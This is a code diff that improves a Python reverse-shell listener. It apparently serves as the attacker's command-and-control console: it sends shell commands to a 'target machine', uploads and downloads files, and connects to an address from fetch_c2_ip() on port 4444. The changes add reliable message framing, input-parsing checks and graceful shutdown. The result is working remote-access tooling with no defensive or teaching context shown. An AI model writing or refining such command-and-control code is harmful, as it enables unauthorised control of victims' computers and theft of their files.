@@ -25,24 +25,37 @@ class Listener:
 
 
     def reliable_send(self, data):
-        json_data = json.dumps(data)  # Convert the data to JSON format
-        self.connection.send(json_data.encode())  # Send the JSON data to the target machine
+        json_data = json.dumps(data).encode()
+        length = len(json_data).to_bytes(4, byteorder='big')
+        self.connection.send(length + json_data)
 
 
     def reliable_receive(self):
-        json_data = ""  # Initialize the variable
-        while True:
+        raw_length = self._recvall(4)
+        if raw_length is None:
+            return None
+        message_length = int.from_bytes(raw_length, byteorder='big')
+        json_data = self._recvall(message_length)
+        return json.loads(json_data.decode())
+    
+    def _recvall(self, length):
+        data = b""
+        while len(data) < length:
             try:
-                json_data = json_data + self.connection.recv(1024).decode()  # Receive the JSON data from the target machine
-                return json.loads(json_data)  # Convert the JSON data to Python data
-            except ValueError:
-                continue
+                packet = self.connection.recv(length - len(data))
+                if not packet:
+                    return None
+                data += packet
+            except socket.error:
+                return None
+        return data
 
 
     def execute_remotely(self, command):
         self.reliable_send(command)  # Send the command to the target machine
         if command[0] == "exit":
             self.connection.close()
+            print("\n[!] Connection closed")
             exit()
         return self.reliable_receive()  # Receive the result from the target machine
     
@@ -50,7 +63,7 @@ class Listener:
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))  # Write the content to the file
-            return "[+] Download successful"
+        return "[+] Download successful"
         
 
     def read_file(self, path):
@@ -60,8 +73,12 @@ class Listener:
 
     def run(self):
         while True:
-            command = input(f"\nShell> ")  # Get the command from the user
-            command = shlex.split(command)   # Split the command
+            command = input(f"\nShell >> ")  # Get the command from the user
+            try:
+                command = shlex.split(command)  # Split the command into a list
+            except ValueError as e:
+                print(f"[!] Invalid command syntax: {e}")
+                continue
 
             try:
                 if command[0] == "upload":
@@ -70,13 +87,20 @@ class Listener:
 
                 result = self.execute_remotely(command)
 
-                if command[0] == "download" and "[-] Error " not in result:
+                if command[0] == "download" and isinstance(result, str) and "[-] Error" not in result:
                     result = self.write_file(command[1], result)
             except Exception:
                 result = "[-] Error during command executionnnn" # If there is an error, print this message    
             
             print(result)  # Print the result
 
-
-my_listener = Listener(fetch_c2_ip(), 4444)  # Create an object of the class
-my_listener.run()  # Call the run method
+try:
+    my_listener = Listener(fetch_c2_ip(), 4444)
+    my_listener.run()
+except KeyboardInterrupt:
+    print("\n[!] Listener terminated by user.")
+    try:
+        my_listener.connection.close()
+    except:
+        pass
+    exit()
